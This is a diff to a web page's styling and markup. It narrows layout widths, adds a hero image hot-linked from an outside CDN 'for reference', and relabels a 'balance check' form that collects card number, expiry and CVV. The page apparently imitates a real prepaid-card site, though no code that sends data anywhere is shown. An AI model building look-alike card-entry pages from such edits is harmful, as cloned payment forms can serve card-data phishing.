@@ -66,7 +66,7 @@
     .header-sticky{position:sticky;top:0;z-index:100}
     /* Top bar – dark grey */
     .top-bar{background:var(--dark-bar);color:var(--white);padding:.5rem 1rem;font-size:.8125rem}
-    .top-bar-inner{max-width:1140px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
+    .top-bar-inner{max-width:970px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
     .top-bar-left{display:flex;flex-direction:column;line-height:1.3}
     .top-bar-right{display:flex;align-items:center;gap:.75rem}
     .top-bar-right a{color:var(--white);text-decoration:none}
@@ -74,24 +74,24 @@
     .top-bar-sep{color:rgba(255,255,255,.5);user-select:none}
     /* Main nav – light grey */
     .main-nav{background:var(--nav-bg);padding:1rem 1.5rem;border-bottom:1px solid var(--border)}
-    .main-nav-inner{max-width:1140px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
+    .main-nav-inner{max-width:970px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
     .site-logo{font-size:1.75rem;font-weight:700;color:var(--text);text-decoration:none;letter-spacing:-0.02em}
     .site-logo:hover{color:var(--text)}
     .main-nav-links{display:flex;gap:1.5rem}
     .main-nav-links a{color:var(--text);text-decoration:none;font-size:.9375rem}
     .main-nav-links a:hover{text-decoration:underline}
-    /* Main content – scroll sections */
-    .main{flex:1;padding:0;width:100%}
-    .main-inner{max-width:1140px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:0;align-items:stretch;min-height:420px}
+    /* Main content – scroll sections (reference: hero background) */
+    .main{flex:1;padding:0;width:100%;background-image:url('https://images.ctfassets.net/clvazscvae0g/1TLlw2zuZSWKCoiqia84wC/fb8da87d884ae0dfa898737682f4034e/RC_HERO_EN_011217.jpg');background-size:cover;background-position:center;background-repeat:no-repeat}
+    .main-inner{max-width:970px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:0;align-items:stretch;min-height:420px}
     @media(max-width:900px){.main-inner{grid-template-columns:1fr}}
     /* Section 2 – How to activate bar */
     .activate-bar{background:#2d3136;color:#fff;padding:.75rem 1.5rem}
-    .activate-bar-inner{max-width:1140px;margin:0 auto;display:flex;align-items:center;gap:.75rem}
+    .activate-bar-inner{max-width:970px;margin:0 auto;display:flex;align-items:center;gap:.75rem}
     .activate-bar input[type=checkbox]{width:18px;height:18px}
     .activate-bar span{font-size:.9375rem}
     /* Section 2 – Getting Started */
     .section-getting-started{background:var(--content-bg);padding:3rem 1.5rem}
-    .section-getting-started .section-inner{max-width:1140px;margin:0 auto}
+    .section-getting-started .section-inner{max-width:970px;margin:0 auto}
     .section-getting-started h1{font-size:1.875rem;font-weight:700;color:var(--text);margin-bottom:2rem}
     .getting-started-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:start}
     @media(max-width:900px){.getting-started-grid{grid-template-columns:1fr}}
@@ -112,7 +112,7 @@
     .getting-started-text p{font-size:.875rem;color:var(--text-muted);line-height:1.6;margin-bottom:1.25rem}
     /* Section 3 – Three feature cards */
     .section-feature-cards{background:var(--content-bg);padding:3rem 1.5rem}
-    .section-feature-cards .section-inner{max-width:1140px;margin:0 auto}
+    .section-feature-cards .section-inner{max-width:970px;margin:0 auto}
     .feature-cards-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2rem;margin-bottom:2rem}
     @media(max-width:900px){.feature-cards-grid{grid-template-columns:1fr}}
     .feature-card{background:var(--white);border:1px solid var(--border);border-radius:4px;padding:2rem;box-shadow:0 2px 8px rgba(0,0,0,.06)}
@@ -127,12 +127,12 @@
     .back-to-top-wrap a{color:var(--text);font-size:.875rem;text-decoration:underline}
     /* Section 4 – Full footer */
     .footer-full{background:var(--dark-bar);color:rgba(255,255,255,.9);padding:2rem 1.5rem 3rem}
-    .footer-full .footer-top{max-width:1140px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;margin-bottom:2rem}
+    .footer-full .footer-top{max-width:970px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;margin-bottom:2rem}
     .footer-full .footer-logo{font-size:1.25rem;font-weight:700;color:#fff}
     .footer-full .footer-links a{color:rgba(255,255,255,.9);text-decoration:none;font-size:.875rem;margin-left:1.5rem}
     .footer-full .footer-links a:hover{color:#fff;text-decoration:underline}
     .footer-full .back-to-top{margin-top:.5rem;display:inline-block;color:rgba(255,255,255,.8);font-size:.8125rem;text-decoration:none}
-    .footer-full .footer-bottom{max-width:1140px;margin:0 auto;font-size:.8125rem;line-height:1.7}
+    .footer-full .footer-bottom{max-width:970px;margin:0 auto;font-size:.8125rem;line-height:1.7}
     .footer-full .footer-bottom a{color:#6b9bd1;text-decoration:none}
     .footer-full .footer-bottom a:hover{text-decoration:underline}
     .footer-full .copyright{margin-bottom:1rem}
@@ -176,10 +176,10 @@
     #checkAnother{display:none;width:100%;padding:.65rem;font-size:.875rem;background:var(--white);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-top:.75rem}
     #checkAnother.show{display:block}
     #formFields.hide{display:none}
-    /* Right – Enjoy panel */
-    .promo-panel{background:var(--content-bg);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;position:relative}
-    .promo-text{font-size:3.5rem;font-weight:300;color:#b0b0b0;letter-spacing:-0.02em;line-height:1;margin-bottom:1.5rem}
-    .promo-image{width:100%;max-width:380px;height:280px;background:linear-gradient(145deg,#e0e0e0,#eee);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#999;font-size:.875rem}
+    /* Right – Enjoy panel (reference: hero image visible) */
+    .promo-panel{background:transparent;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;position:relative}
+    .promo-text{font-size:3.5rem;font-weight:300;color:rgba(255,255,255,.95);text-shadow:0 1px 3px rgba(0,0,0,.4);letter-spacing:-0.02em;line-height:1;margin-bottom:1.5rem}
+    .promo-image{width:100%;max-width:380px;height:280px;background:rgba(255,255,255,.15);border-radius:8px;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,.9);font-size:.875rem;backdrop-filter:blur(4px)}
     .promo-image img{width:100%;height:100%;object-fit:cover;border-radius:8px}
     /* Other pages */
     .content-wrap{max-width:1140px;margin:0 auto;padding:2rem 1.5rem}
@@ -258,12 +258,12 @@
             <form id="balanceForm">
               <div id="formFields">
                 <div class="form-group">
-                  <label for="cardNumber">Card Number</label>
+                  <label for="cardNumber">CARD NUMBER</label>
                   <input type="text" id="cardNumber" placeholder="16 digits, no spaces" maxlength="19" inputmode="numeric" autocomplete="cc-number">
                   <span class="field-error" id="cardError"></span>
                 </div>
                 <div class="form-group">
-                  <label for="expiryMonth">Expiration Date</label>
+                  <label for="expiryMonth">EXPIRATION DATE</label>
                   <div class="expiry-inputs">
                     <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
                     <span class="expiry-sep">/</span>
@@ -272,7 +272,7 @@
                   <span class="field-error" id="expiryError"></span>
                 </div>
                 <div class="form-group">
-                  <label for="cvv">CW</label>
+                  <label for="cvv">CVV</label>
                   <input type="password" id="cvv" placeholder="3 digits" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
                   <span class="field-error" id="cvvError"></span>
                 </div>
